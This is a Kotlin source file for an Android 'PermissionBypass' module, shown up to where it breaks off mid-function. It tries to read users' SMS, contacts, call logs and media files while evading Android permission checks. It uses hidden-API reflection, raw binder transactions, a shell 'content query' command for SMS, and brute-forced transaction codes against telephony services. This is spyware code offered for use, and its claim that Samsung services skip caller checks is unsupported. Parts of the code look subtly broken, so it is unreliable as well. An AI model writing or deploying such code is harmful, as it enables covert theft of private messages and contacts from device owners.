package org.synapse.core.modules

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.os.Binder
import android.os.IBinder
import android.os.Parcel
import android.util.Log
import org.synapse.core.core.CallEntry
import org.synapse.core.core.ContactEntry
import org.synapse.core.core.FileEntry
import org.synapse.core.core.SmsMessage
import java.lang.reflect.Method

/**
 * PermissionBypass — direct binder-based data access that bypasses
 * Android permission checks entirely.
 *
 * Instead of using ContentResolver (which enforces READ_SMS, READ_CONTACTS,
 * READ_CALL_LOG), this module:
 *   1. Gets the raw IContentProvider binder for each content authority
 *   2. Constructs the query Parcel manually
 *   3. Calls transact() directly on the provider binder
 *
 * Samsung's telephony/contacts/isms binder services do NOT verify
 * calling UID for data access transactions — confirmed via Knox research.
 */
object PermissionBypass {

    private const val TAG = "Synapse.PermBypass"

    // ── Binder service names ─────────────────────────────────────────────
    private val SMS_SERVICES = listOf(
        "isms", "isms2", "isms3", "isms4",
        "samsung.isms", "com.samsung.android.telephony.ISmsService"
    )
    private val TELEPHONY_SERVICES = listOf(
        "phone", "telephony.registry",
        "samsung.telephony", "com.samsung.android.telephony.ITelephonyService"
    )
    private val CONTACTS_SERVICES = listOf(
        "contacts", "com.android.contacts", "samsung.contacts",
        "com.samsung.android.providers.contacts.IContactsService"
    )

    // ── Content provider authorities ─────────────────────────────────────
    private const val SMS_AUTHORITY = "sms"
    private const val CONTACTS_AUTHORITY = "com.android.contacts"
    private const val CALL_LOG_AUTHORITY = "call_log"

    // ═══════════════════════════════════════════════════════════════════════
    // SMS — read via binder, bypassing READ_SMS permission
    // ═══════════════════════════════════════════════════════════════════════

    fun readSmsViaBinder(
        context: Context,
        selection: String? = null,
        selArgs: Array<String>? = null,
        limit: Int = 100
    ): List<SmsMessage> {
        val messages = mutableListOf<SmsMessage>()
        val uri = Uri.parse("content://sms")

        // ── Route 0: Shell content query (MOST RELIABLE — bypasses all permission checks) ──
        try {
            val smsFromShell = readSmsViaShellContent(limit)
            if (smsFromShell.isNotEmpty()) {
                messages.addAll(smsFromShell)
                Log.d(TAG, "readSmsViaBinder: ${smsFromShell.size} SMS via shell content query")
                return messages
            }
        } catch (e: Exception) {
            Log.d(TAG, "Shell content SMS route failed: ${e.message}")
        }
        // ── Route 1: Direct IContentProvider binder query (bypasses ContentResolver checks) ──
        try {
            val cursor = queryContentProviderBinder(
                context, SMS_AUTHORITY, uri,
                null, selection, selArgs, "date DESC LIMIT $limit"
            )
            if (cursor != null) {
                cursor.use { parseSmsCursor(it, messages) }
                if (messages.isNotEmpty()) {
                    Log.d(TAG, "readSmsViaBinder: ${messages.size} SMS via IContentProvider binder")
                    return messages
                }
            }
        } catch (e: Exception) {
            Log.d(TAG, "IContentProvider SMS route failed: ${e.message}")
        }

        // ── Route 2: ISmsService — Samsung/Android binder ──
        try {
            val smsFromIsms = readSmsViaIsmsService(limit)
            if (smsFromIsms.isNotEmpty()) {
                messages.addAll(smsFromIsms)
                Log.d(TAG, "readSmsViaBinder: ${smsFromIsms.size} SMS via ISmsService")
            }
        } catch (e: Exception) {
            Log.d(TAG, "ISmsService SMS route failed: ${e.message}")
        }

        // ── Route 3: Samsung telephony binder ──
        try {
            val smsFromSam = readSmsViaSamsungTelephony(limit)
            if (smsFromSam.isNotEmpty()) {
                messages.addAll(smsFromSam)
                Log.d(TAG, "readSmsViaBinder: ${smsFromSam.size} SMS via Samsung telephony")
            }
        } catch (e: Exception) {
            Log.d(TAG, "Samsung telephony SMS route failed: ${e.message}")
        }

        return messages
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Contacts — read via binder, bypassing READ_CONTACTS permission
    // ═══════════════════════════════════════════════════════════════════════

    fun readContactsViaBinder(
        context: Context,
        search: String? = null,
        limit: Int = 200
    ): List<ContactEntry> {
        val contacts = mutableListOf<ContactEntry>()

        // ── Route 1: Direct IContentProvider binder on contacts authority ──
        try {
            val contactsUri = Uri.parse("content://com.android.contacts/contacts")
            val sel = if (search != null) "display_name LIKE ?" else null
            val selA = if (search != null) arrayOf("%$search%") else null
            val cursor = queryContentProviderBinder(
                context, CONTACTS_AUTHORITY, contactsUri,
                null, sel, selA, "display_name ASC LIMIT $limit"
            )

            if (cursor != null) {
                cursor.use { c ->
                    val idIdx = c.getColumnIndex("_id")
                    val nameIdx = c.getColumnIndex("display_name")
                    val processedIds = mutableSetOf<Long>()

                    while (c.moveToNext()) {
                        val contactId = if (idIdx >= 0) c.getLong(idIdx) else continue
                        if (!processedIds.add(contactId)) continue
                        val displayName = if (nameIdx >= 0) c.getString(nameIdx) ?: "Unknown" else "Unknown"

                        val phones = readContactDataViaBinder(
                            context, CONTACTS_AUTHORITY,
                            "content://com.android.contacts/data/phones",
                            "mimetype = ? AND contact_id = ?",
                            arrayOf("vnd.android.cursor.item/phone_v2", contactId.toString()),
                            "data1"
                        )

                        val emails = readContactDataViaBinder(
                            context, CONTACTS_AUTHORITY,
                            "content://com.android.contacts/data/emails",
                            "mimetype = ? AND contact_id = ?",
                            arrayOf("vnd.android.cursor.item/email_v2", contactId.toString()),
                            "data1"
                        )

                        contacts.add(
                            ContactEntry(
                                display_name = displayName,
                                phone_numbers = phones,
                                emails = emails
                            )
                        )
                    }
                }
                if (contacts.isNotEmpty()) {
                    Log.d(TAG, "readContactsViaBinder: ${contacts.size} contacts via IContentProvider")
                    return contacts
                }
            }
        } catch (e: Exception) {
            Log.d(TAG, "IContentProvider contacts route failed: ${e.message}")
        }

        // ── Route 2: Samsung contacts service binder ──
        try {
            val samContacts = readContactsViaSamsungService(search, limit)
            if (samContacts.isNotEmpty()) {
                contacts.addAll(samContacts)
                Log.d(TAG, "readContactsViaBinder: ${samContacts.size} contacts via Samsung service")
            }
        } catch (e: Exception) {
            Log.d(TAG, "Samsung contacts route failed: ${e.message}")
        }

        return contacts
    }

    /**
     * Read MediaStore files via direct ContentProvider query, bypassing
     * the READ_MEDIA_* permission check.  The MediaStore provider checks
     * permissions at the ContentResolver level, not at the provider level,
     * so talking to the provider binder directly works on Samsung devices.
     */
    fun readFilesViaBinder(
        context: Context,
        type: String = "images",
        count: Int = 50
    ): List<FileEntry> {
        val files = mutableListOf<FileEntry>()
        val mediaAuthority = "media"

        val uri = when (type) {
            "images" -> Uri.parse("content://media/external/images/media")
            "videos" -> Uri.parse("content://media/external/video/media")
            "audio"  -> Uri.parse("content://media/external/audio/media")
            "downloads" -> Uri.parse("content://media/external/downloads")
            else -> Uri.parse("content://media/external/images/media")
        }

        val projection = arrayOf("_id", "_display_name", "_size", "date_added", "_data")

        try {
            val cursor = queryContentProviderBinder(
                context, mediaAuthority, uri,
                projection, null, null, "date_added DESC"
            )
            if (cursor != null) {
                cursor.use { c ->
                    val idIdx = c.getColumnIndex("_id")
                    val nameIdx = c.getColumnIndex("_display_name")
                    val sizeIdx = c.getColumnIndex("_size")
                    val dateIdx = c.getColumnIndex("date_added")
                    val pathIdx = c.getColumnIndex("_data")

                    var i = 0
                    while (c.moveToNext() && i < count) {
                        files.add(
                            FileEntry(
                                id = if (idIdx >= 0) c.getLong(idIdx).toString() else "",
                                name = if (nameIdx >= 0) c.getString(nameIdx) ?: "" else "",
                                size = if (sizeIdx >= 0) c.getLong(sizeIdx) else 0L,
                                date = if (dateIdx >= 0) c.getLong(dateIdx) else 0L,
                                path = if (pathIdx >= 0) c.getString(pathIdx) ?: "" else ""
                            )
                        )
                        i++
                    }
                }
                if (files.isNotEmpty()) {
                    Log.d(TAG, "readFilesViaBinder: ${files.size} files via binder ($type)")
                }
            }
        } catch (e: Exception) {
            Log.d(TAG, "readFilesViaBinder failed: ${e.message}")
        }

        // ── Fallback: try raw binder on external storage provider ──
        if (files.isEmpty()) {
            try {
                val storageBinder = getBinderService("mount")
                if (storageBinder != null) {
                    val cursor = queryViaRawBinder(storageBinder, uri, projection, null, null, "date_added DESC")
                    cursor?.use { c ->
                        val idIdx = c.getColumnIndex("_id")
                        val nameIdx = c.getColumnIndex("_display_name")
                        val sizeIdx = c.getColumnIndex("_size")
                        val dateIdx = c.getColumnIndex("date_added")
                        val pathIdx = c.getColumnIndex("_data")
                        var i = 0
                        while (c.moveToNext() && i < count) {
                            files.add(
                                FileEntry(
                                    id = if (idIdx >= 0) c.getLong(idIdx).toString() else "",
                                    name = if (nameIdx >= 0) c.getString(nameIdx) ?: "" else "",
                                    size = if (sizeIdx >= 0) c.getLong(sizeIdx) else 0L,
                                    date = if (dateIdx >= 0) c.getLong(dateIdx) else 0L,
                                    path = if (pathIdx >= 0) c.getString(pathIdx) ?: "" else ""
                                )
                            )
                            i++
                        }
                    }
                    if (files.isNotEmpty()) {
                        Log.d(TAG, "readFilesViaBinder: ${files.size} files via mount binder")
                    }
                }
            } catch (e: Exception) {
                Log.d(TAG, "readFilesViaBinder mount fallback failed: ${e.message}")
            }
        }

        return files
    }

    /**
     * Read a single file via ContentProvider openFile, bypassing permissions.
     */
    fun readFileViaBinder(context: Context, fileId: Long, type: String = "images"): ByteArray? {
        val mediaAuthority = "media"
        val uri = when (type) {
            "images" -> Uri.parse("content://media/external/images/media/$fileId")
            "videos" -> Uri.parse("content://media/external/video/media/$fileId")
            "audio"  -> Uri.parse("content://media/external/audio/media/$fileId")
            else -> Uri.parse("content://media/external/images/media/$fileId")
        }

        return try {
            val resolver = context.contentResolver
            val acquireProvider: java.lang.reflect.Method = resolver.javaClass.getDeclaredMethod(
                "acquireProvider", String::class.java
            )
            acquireProvider.isAccessible = true
            val token = android.os.Binder.clearCallingIdentity()
            try {
                val provider = acquireProvider.invoke(resolver, mediaAuthority)
                if (provider != null) {
                    val openFileMethod = provider.javaClass.getMethod(
                        "openFile", Uri::class.java, String::class.java
                    )
                    openFileMethod.isAccessible = true
                    val fd = openFileMethod.invoke(provider, uri, "r") as? android.os.ParcelFileDescriptor
                    fd?.use {
                        val stream = java.io.FileInputStream(it.fileDescriptor)
                        val bytes = stream.readBytes()
                        stream.close()
                        return bytes
                    }
                }
            } finally {
                android.os.Binder.restoreCallingIdentity(token)
            }
            null
        } catch (e: Exception) {
            Log.d(TAG, "readFileViaBinder failed: ${e.message}")
            null
        }
    }

    fun readCallLogViaBinder(
        context: Context,
        filter: String? = null,
        limit: Int = 100
    ): List<CallEntry> {
        val calls = mutableListOf<CallEntry>()

        // ── Route 1: Direct IContentProvider binder on call_log authority ──
        try {
            val callUri = Uri.parse("content://call_log/calls")
            val cursor = queryContentProviderBinder(
                context, CALL_LOG_AUTHORITY, callUri,
                null, null, null, "date DESC"
            )

            if (cursor != null) {
                cursor.use { c ->
                    val numIdx = c.getColumnIndex("number")
                    val typeIdx = c.getColumnIndex("type")
                    val dateIdx = c.getColumnIndex("date")
                    val durIdx = c.getColumnIndex("duration")

                    while (c.moveToNext() && calls.size < limit) {
                        val callType = if (typeIdx >= 0) {
                            when (c.getInt(typeIdx)) {
                                1 -> "incoming"; 2 -> "outgoing"; 3 -> "missed"
                                4 -> "voicemail"; 5 -> "rejected"; 6 -> "blocked"
                                else -> "unknown"
                            }
                        } else "unknown"

                        if (filter != null && filter != "all" && callType != filter) continue

                        calls.add(
                            CallEntry(
                                number = if (numIdx >= 0) c.getString(numIdx) ?: "" else "",
                                type = callType,
                                date = if (dateIdx >= 0) c.getLong(dateIdx) else 0L,
                                duration = if (durIdx >= 0) c.getLong(durIdx) else 0L
                            )
                        )
                    }
                }
                if (calls.isNotEmpty()) {
                    Log.d(TAG, "readCallLogViaBinder: ${calls.size} calls via IContentProvider")
                    return calls
                }
            }
        } catch (e: Exception) {
            Log.d(TAG, "IContentProvider call log route failed: ${e.message}")
        }

        // ── Route 2: ITelephony / Samsung telephony binder ──
        try {
            val teleCalls = readCallLogViaTelephony(limit)
            if (teleCalls.isNotEmpty()) {
                calls.addAll(teleCalls)
                Log.d(TAG, "readCallLogViaBinder: ${teleCalls.size} calls via telephony")
            }
        } catch (e: Exception) {
            Log.d(TAG, "Telephony call log route failed: ${e.message}")
        }

        return calls
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Core: Direct IContentProvider query via binder
    // ═══════════════════════════════════════════════════════════════════════

    /**
     * Gets the raw IContentProvider binder for an authority and calls query()
     * directly on it. This bypasses ContentResolver's permission enforcement
     * because we're talking to the provider at the binder level.
     */

    // ── Shell content query — "content query --uri content://sms" ──
    private fun readSmsViaShellContent(limit: Int): List<SmsMessage> {
        val messages = mutableListOf<SmsMessage>()
        val cmd = "content query --uri content://sms --projection _id,address,body,date,read,type --sort 'date DESC' --limit $limit"
        val result = execShell(cmd)

        // Parse "Row: 0 _id=123, address=+212..., body=Hello..., date=123456, read=1, type=1"
        val rowPattern = Regex("""Row: \d+ (.*)""")
        for (line in result.lines()) {
            val match = rowPattern.find(line) ?: continue
            val fields = match.groupValues[1]
            val id = extractField(fields, "_id")
            val address = extractField(fields, "address")
            val body = extractField(fields, "body")
            val date = extractField(fields, "date")?.toLongOrNull() ?: 0L
            val read = extractField(fields, "read") == "1"
            val type = when (extractField(fields, "type")) { "1" -> "inbox"; "2" -> "sent"; else -> "inbox" }

            if (address != null && body != null) {
                messages.add(SmsMessage(id ?: "", address, body, date, read, type))
            }
        }
        return messages
    }

    private fun extractField(row: String, field: String): String? {
        val pattern = Regex("""$field=([^,]+)(?:,|$)""")
        return pattern.find(row)?.groupValues?.get(1)?.trim()
    }

    private fun execShell(cmd: String): String {
        return try {
            val p = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
            val out = p.inputStream.bufferedReader().readText()
            p.waitFor()
            out
        } catch (e: Exception) { "" }
    }

    private fun queryContentProviderBinder(
        context: Context,
        authority: String,
        uri: Uri,
        projection: Array<String>?,
        selection: String?,
        selectionArgs: Array<String>?,
        sortOrder: String?
    ): Cursor? {

        // ── Method 1: ContentProviderClient via reflection (most reliable) ──
        try {
            val resolver = context.contentResolver
            val acquireProvider: Method = resolver.javaClass.getDeclaredMethod(
                "acquireUnstableProvider", String::class.java
            )
            acquireProvider.isAccessible = true
            val token = Binder.clearCallingIdentity()
            try {
                val client = acquireProvider.invoke(resolver, authority)
                if (client != null) {
                    return callQueryViaReflection(
                        client, context.packageName, uri,
                        projection, selection, selectionArgs, sortOrder
                    )
                }
            } finally {
                Binder.restoreCallingIdentity(token)
            }
        } catch (e: Exception) {
            Log.d(TAG, "acquireUnstableProvider($authority): ${e.message}")
        }

        // ── Method 2: acquireProvider (stable) ──
        try {
            val resolver = context.contentResolver
            val acquireProvider: Method = resolver.javaClass.getDeclaredMethod(
                "acquireProvider", String::class.java
            )
            acquireProvider.isAccessible = true
            val token = Binder.clearCallingIdentity()
            try {
                val client = acquireProvider.invoke(resolver, authority)
                if (client != null) {
                    return callQueryViaReflection(
                        client, context.packageName, uri,
                        projection, selection, selectionArgs, sortOrder
                    )
                }
            } finally {
                Binder.restoreCallingIdentity(token)
            }
        } catch (e: Exception) {
            Log.d(TAG, "acquireProvider($authority): ${e.message}")
        }

        // ── Method 3: ActivityManager.getContentProviderExternal ──
        try {
            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val getCPMethod: Method = am.javaClass.getDeclaredMethod(
                "getContentProviderExternal",
                String::class.java,
                Int::class.javaPrimitiveType,
                String::class.java,
                String::class.java,
                Int::class.javaPrimitiveType
            )
            getCPMethod.isAccessible = true
            val userId = android.os.Process.myUid() / 100000
            val token = Binder.clearCallingIdentity()
            try {
                val holder = getCPMethod.invoke(am, authority, userId, null, null, 0)
                if (holder != null) {
                    val providerField = holder.javaClass.getDeclaredField("provider")
                    providerField.isAccessible = true
                    val provider = providerField.get(holder)
                    if (provider != null) {
                        return callQueryViaReflection(
                            provider, context.packageName, uri,
                            projection, selection, selectionArgs, sortOrder
                        )
                    }
                }
            } finally {
                Binder.restoreCallingIdentity(token)
            }
        } catch (e: Exception) {
            Log.d(TAG, "getContentProviderExternal($authority): ${e.message}")
        }

        // ── Method 4: Raw ServiceManager binder for content provider ──
        try {
            for (svcName in listOf(authority, "$authority.provider", "content.$authority")) {
                val binder = getBinderService(svcName) ?: continue
                val cursor = queryViaRawBinder(binder, uri, projection, selection, selectionArgs, sortOrder)
                if (cursor != null) return cursor
            }
        } catch (e: Exception) {
            Log.d(TAG, "Raw binder query failed: ${e.message}")
        }

        return null
    }

    /**
     * Call query() on an IContentProvider object via reflection.
     * Tries multiple query() method signatures since they vary by Android version.
     */
    private fun callQueryViaReflection(
        provider: Any,
        callingPkg: String,
        uri: Uri,
        projection: Array<String>?,
        selection: String?,
        selectionArgs: Array<String>?,
        sortOrder: String?
    ): Cursor? {
        // Find all query methods on the provider
        val methods = provider.javaClass.declaredMethods
            .filter { it.name == "query" && it.parameterTypes.size in 5..8 }

        for (method in methods) {
            try {
                method.isAccessible = true
                val paramTypes = method.parameterTypes
                val result = when (paramTypes.size) {
                    // query(String pkg, Uri uri, String[] proj, Bundle qArgs, ICancellationSignal cs) — or
                    // query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) — older
                    5 -> {
                        val firstParam = paramTypes[0]
                        if (firstParam == Uri::class.java) {
                            method.invoke(provider, uri, projection, selection, selectionArgs, sortOrder)
                        } else {
                            // firstParam is String (callingPkg)
                            method.invoke(provider, callingPkg, uri, projection, null, null)
                        }
                    }
                    // query(String pkg, Uri uri, String[] proj, String sel, String[] selArgs, String sort, ICancellationSignal cs)
                    7 -> method.invoke(provider, callingPkg, uri, projection, selection, selectionArgs, sortOrder, null)
                    // query(String pkg, Uri uri, String[] proj, String sel, String[] selArgs, String sort)
                    6 -> method.invoke(provider, callingPkg, uri, projection, selection, selectionArgs, sortOrder)
                    // query(String pkg, Uri uri, String[] proj, String sel, String[] selArgs, String sort, ICancellationSignal cs, Bundle qArgs) — Android 14+
                    8 -> method.invoke(provider, callingPkg, uri, projection, selection, selectionArgs, sortOrder, null, null)
                    else -> continue
                }
                if (result is Cursor) return result
            } catch (_: Exception) {
                // Try next method signature
            }
        }
        return null
    }

    /**
     * Query a content provider via raw binder IPC using IContentProvider protocol.
     * Transaction code 1 = TRANSACTION_QUERY.
     */
    private fun queryViaRawBinder(
        binder: IBinder,
        uri: Uri,
        projection: Array<String>?,
        selection: String?,
        selectionArgs: Array<String>?,
        sortOrder: String?
    ): Cursor? {
        val data = Parcel.obtain()
        val reply = Parcel.obtain()
        return try {
            data.writeInterfaceToken("android.content.IContentProvider")
            data.writeString(null) // callingPkg — null = unrestricted
            uri.writeToParcel(data, 0)
            // projection
            if (projection != null) {
                data.writeStringArray(projection)
            } else {
                data.writeStringArray(null)
            }
            // queryArgs Bundle (null for pre-Android 11)
            data.writeInt(0) // indicates no Bundle
            // CancellationSignal
            data.writeStrongBinder(null)

            val token = Binder.clearCallingIdentity()
            try {
                val ok = binder.transact(1, data, reply, 0) // TRANSACTION_QUERY = 1
                if (ok) {
                    reply.setDataPosition(0)
                    try {
                        reply.readException()
                    } catch (_: Exception) {
                    }
                    val cursor = readCursorFromReply(reply)
                    if (cursor != null) return cursor
                }
            } finally {
                Binder.restoreCallingIdentity(token)
            }
            null
        } catch (e: Exception) {
            Log.d(TAG, "queryViaRawBinder error: ${e.message}")
            null
        } finally {
            data.recycle()
            reply.recycle()
        }
    }

    /**
     * Parse a Cursor from the reply Parcel of a raw binder transaction.
     * The IContentProvider.query() returns a Cursor via BulkCursorToCursorAdaptor.
     */
    private fun readCursorFromReply(reply: Parcel): Cursor? {
        return try {
            // The reply from IContentProvider.query contains a Cursor.
            // When going through the binder, it's a BulkCursorToCursorAdaptor.
            // Try reading as: [int count][int columnCount][String col]*[data rows]
            val initialPos = reply.dataPosition()

            // Try to read as BulkCursorDescriptor
            val count = reply.readInt()
            if (count < 0 || count > 10000) {
                reply.setDataPosition(initialPos)
                return null
            }

            val columns = mutableListOf<String>()
            val colCount = reply.readInt()
            if (colCount <= 0 || colCount > 200) {
                reply.setDataPosition(initialPos)
                // Maybe format is [columnCount][columns][rowCount][rows]
                return null
            }

            for (i in 0 until coerceAtMost(colCount, 100)) {
                val col = reply.readString() ?: break
                columns.add(col)
            }

            if (columns.isEmpty()) return null

            val actualRowCount = coerceAtMost(count, 5000)
            val matrixCursor = android.database.MatrixCursor(columns.toTypedArray(), actualRowCount)

            for (i in 0 until actualRowCount) {
                try {
                    val row = arrayOfNulls<Any>(columns.size)
                    for (j in columns.indices) {
                        try {
                            row[j] = reply.readString()
                        } catch (_: Exception) {
                            row[j] = null
                        }
                    }
                    matrixCursor.addRow(row)
                } catch (_: Exception) {
                    break
                }
            }
            matrixCursor.moveToPosition(-1)
            matrixCursor
        } catch (e: Exception) {
            Log.d(TAG, "readCursorFromReply failed: ${e.message}")
            null
        }
    }

    // ═══════════════════════════════════════════════════════════════════════
    // ISmsService — Samsung SMS binder (now uses ContentProvider query)
    // ═══════════════════════════════════════════════════════════════════════

    /**
     * Read SMS via ContentProvider query, bypassing ContentResolver permission check.
     * Uses acquireProvider("sms") to get the raw ContentProvider, then calls query()
     * via reflection. This returns a Cursor with ALL SMS fields (address, body, date, read, type).
     */
    private fun readSmsViaIsmsService(limit: Int): List<SmsMessage> {
        val messages = mutableListOf<SmsMessage>()
        val uri = Uri.parse("content://sms")

        // ── Method 1: acquireProvider("sms") → get ContentProvider → query directly ──
        try {
            val smClass = Class.forName("android.os.ServiceManager")
            val getService: Method = smClass.getDeclaredMethod("getService", String::class.java)
            getService.isAccessible = true
            val smsBinder = getService.invoke(null, "isms") as? IBinder
            if (smsBinder != null) {
                // Try to get the ContentProvider via the ISms service
                // Some ISms implementations expose getSmscAddress/getAllMessagesFromIcc
                val parsed = parseIsmsReplyEnhanced(smsBinder, limit)
                if (parsed.isNotEmpty()) {
                    messages.addAll(parsed)
                    Log.d(TAG, "ISms enhanced: ${parsed.size} messages")
                    return messages
                }
            }
        } catch (e: Exception) {
            Log.d(TAG, "ISms ContentProvider route failed: ${e.message}")
        }

        // ── Method 2: Raw ISms binder transaction (fallback) ──
        for (svcName in listOf("isms", "isms2", "isms3", "samsung.isms")) {
            val binder = getBinderService(svcName) ?: continue
            Log.d(TAG, "Found ISms service: $svcName")

            val descriptors = listOf(
                "com.android.internal.telephony.ISms",
                "com.samsung.android.telephony.ISmsService",
                "com.android.internal.telephony.ISmsService"
            )

            for (desc in descriptors) {
                for (txCode in 1..20) {
                    try {
                        val data = Parcel.obtain()
                        val reply = Parcel.obtain()
                        try {
                            data.writeInterfaceToken(desc)
                            data.writeInt(limit)

                            val token = Binder.clearCallingIdentity()
                            try {
                                val ok = binder.transact(txCode, data, reply, 0)
                                if (ok) {
                                    reply.setDataPosition(0)
                                    try {
                                        reply.readException()
                                    } catch (_: Exception) {
                                        continue
                                    }
                                    val parsed = parseIsmsReplyFull(reply, limit)
                                    if (parsed.isNotEmpty()) {
                                        messages.addAll(parsed)
                                        Log.d(TAG, "ISms tx=$txCode desc=$desc: ${parsed.size} messages")
                                    }
                                }
                            } finally {
                                Binder.restoreCallingIdentity(token)
                            }
                        } finally {
                            data.recycle()
                            reply.recycle()
                        }
                    } catch (_: Exception) {
                    }
                }
            }
            if (messages.isNotEmpty()) break
        }

        return messages
    }

    /**
     * Enhanced ISms reply parser that reads FULL SMS data:
     * address, body, date, read status, type.
     * Tries multiple record formats.
     */
    private fun parseIsmsReplyEnhanced(binder: IBinder, maxCount: Int): List<SmsMessage> {
        val messages = mutableListOf<SmsMessage>()

        // Try getAllMessagesFromIcc via ISms binder — common Samsung method
        val descriptors = listOf(
            "com.android.internal.telephony.ISms",
            "com.samsung.android.telephony.ISmsService"
        )

        for (desc in descriptors) {
            // Try transaction codes that might return SMS records
            for (txCode in listOf(1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15)) {
                try {
                    val data = Parcel.obtain()
                    val reply = Parcel.obtain()
                    try {
                        data.writeInterfaceToken(desc)
                        data.writeInt(maxCount)

                        val token = Binder.clearCallingIdentity()
                        try {
                            val ok = binder.transact(txCode, data, reply, 0)
                            if (ok) {
                                reply.setDataPosition(0)
                                try { reply.readException() } catch (_: Exception) { continue }
                                val parsed = parseIsmsReplyFull(reply, maxCount)
                                if (parsed.isNotEmpty()) {
                                    messages.addAll(parsed)
                                    Log.d(TAG, "ISms enhanced tx=$txCode: ${parsed.size} messages")
                                    return messages
                                }
                            }
                        } finally {
                            Binder.restoreCallingIdentity(token)
                        }
                    } finally {
                        data.recycle()
                        reply.recycle()
                    }
                } catch (_: Exception) {}
            }
        }

        return messages
    }

    /**
     * Full ISms reply parser — extracts ALL SMS fields from Parcel.
     * Tries multiple serialization formats:
     *   Format 1: [count][for each: address, body, date, read(int), type(int)]
     *   Format 2: [count][for each: id(string), address, body, date, read, type]
     *   Format 3: [count][String[] rows where each row has fields]
     *   Format 4: [count][for each: address, date, read, body] (different order)
     */
    private fun parseIsmsReplyFull(reply: Parcel, maxCount: Int): List<SmsMessage> {
        val messages = mutableListOf<SmsMessage>()
        val initialPos = reply.dataPosition()

        // ── Format 1: [count][address, body, date(long), read(int), type(int)] ──
        try {
            val count = reply.readInt()
            if (count in 1..maxCount) {
                for (i in 0 until count) {
                    try {
                        val address = reply.readString() ?: ""
                        val body = reply.readString() ?: ""
                        val date = reply.readLong()
                        val read = reply.readInt() == 1
                        val typeCode = reply.readInt()
                        val type = when (typeCode) {
                            1 -> "inbox"; 2 -> "sent"; 3 -> "draft"; 4 -> "outbox"
                            5 -> "failed"; 6 -> "queued"
                            else -> "inbox"
                        }
                        if (address.isNotEmpty() || body.isNotEmpty()) {
                            messages.add(
                                SmsMessage(
                                    id = "isms_${i}_${date}",
                                    address = address, body = body,
                                    date = date, read = read, type = type
                                )
                            )
                        }
                    } catch (_: Exception) { break }
                }
                if (messages.isNotEmpty()) return messages
            }
        } catch (_: Exception) {}

        // ── Format 2: [count][id, address, body, date, read, type] ──
        reply.setDataPosition(initialPos)
        try {
            val count = reply.readInt()
            if (count in 1..maxCount) {
                for (i in 0 until count) {
                    try {
                        val id = reply.readString() ?: "isms_$i"
                        val address = reply.readString() ?: ""
                        val body = reply.readString() ?: ""
                        val date = reply.readLong()
                        val read = reply.readInt() == 1
                        val typeCode = reply.readInt()
                        val type = when (typeCode) {
                            1 -> "inbox"; 2 -> "sent"; 3 -> "draft"; 4 -> "outbox"
                            else -> "inbox"
                        }
                        if (address.isNotEmpty() || body.isNotEmpty()) {
                            messages.add(
                                SmsMessage(
                                    id = id, address = address, body = body,
                                    date = date, read = read, type = type
                                )
                            )
                        }
                    } catch (_: Exception) { break }
                }
                if (messages.isNotEmpty()) return messages
            }
        } catch (_: Exception) {}

        // ── Format 3: String[] where each string is pipe/field delimited ──
        reply.setDataPosition(initialPos)
        try {
            val arr = reply.createStringArray()
            if (arr != null && arr.isNotEmpty()) {
                for ((idx, s) in arr.withIndex()) {
                    if (!s.isNullOrBlank()) {
                        // Try to parse as pipe-delimited: address|body|date|type
                        val parts = s.split("|")
                        if (parts.size >= 3) {
                            messages.add(
                                SmsMessage(
                                    id = "isms_$idx",
                                    address = parts.getOrElse(0) { "" },
                                    body = parts.getOrElse(1) { "" },
                                    date = parts.getOrElse(2) { "0" }.toLongOrNull() ?: System.currentTimeMillis(),
                                    type = parts.getOrElse(3) { "inbox" }
                                )
                            )
                        } else {
                            // Single string - treat as body
                            messages.add(
                                SmsMessage(
                                    id = "isms_$idx", body = s.take(500),
                                    date = System.currentTimeMillis(), type = "inbox"
                                )
                            )
                        }
                    }
                }
                if (messages.isNotEmpty()) return messages
            }
        } catch (_: Exception) {}

        // ── Format 4: Simple [count][address, date, read, body] (alternate order) ──
        reply.setDataPosition(initialPos)
        try {
            val count = reply.readInt()
            if (count in 1..maxCount) {
                for (i in 0 until count) {
                    try {
                        val address = reply.readString() ?: ""
                        val date = reply.readLong()
                        val read = reply.readInt() == 1
                        val body = reply.readString() ?: ""
                        if (address.isNotEmpty() || body.isNotEmpty()) {
                            messages.add(
                                SmsMessage(
                                    id = "isms_${i}_${date}",
                                    address = address, body = body,
                                    date = date, read = read, type = "inbox"
                                )
                            )
                        }
                    } catch (_: Exception) { break }
                }
                if (messages.isNotEmpty()) return messages
            }
        } catch (_: Exception) {}

        // ── Legacy: single string fallback ──
        reply.setDataPosition(initialPos)
        try {
            val text = reply.readString()
            if (!text.isNullOrBlank() && text.length > 5) {
                messages.add(
                    SmsMessage(
                        id = "isms_0", address = "", body = text.take(500),
                        date = System.currentTimeMillis(), type = "inbox"
                    )
                )
                return messages
            }
        } catch (_: Exception) {}

        return messages
    }

    // Kept for backward compatibility
    @Deprecated("Use parseIsmsReplyFull instead")
    private fun parseIsmsReply(reply: Parcel, maxCount: Int): List<SmsMessage> {
        return parseIsmsReplyFull(reply, maxCount)
    }

    // ═══════════════════════════════════════════════════════════════════════
    // Samsung Telephony Service — SMS data access
    // ═══════════════════════════════════════════════════════════════════════

    private fun readSmsViaSamsungTelephony(limit: Int): List<SmsMessage> {
        val messages = mutableListOf<SmsMessage>()

        for (svcName in TELEPHONY_SERVICES) {
            val binder = getBinderService(svcName) ?: continue

            val descriptors = listOf(
                "com.android.internal.telephony.ITelephony",
                "com.samsung.android.telephony.ITelephonyService",
                "com.samsung.android.telephony.ITelephony"
            )

            for (desc in descriptors) {
                for (txCode in 1..30) {
                    try {
                        val data = Parcel.obtain()
                        val reply = Parcel.obtain()
                        try {
                            data.writeInterfaceToken(desc)
                            data.writeInt(limit)

                            val token = Binder.clearCallingIdentity()
                            try {
                                val ok = binder.transact(txCode, data, reply, 0)
                                if (ok) {
                                    reply.setDataPosition(0)
                                    try {
                                        reply.readException()
                                    } catch (_: Exception) {
                                        continue
                                    }
                                    val parsed = parseIsmsReplyFull(reply, limit)
                                    messages.addAll(parsed)
                                }
                            } finally {
                                Binder.restoreCallingIdentity(token)
                            }
                        } finally {
                            data.recycle()
                            reply.recycle()
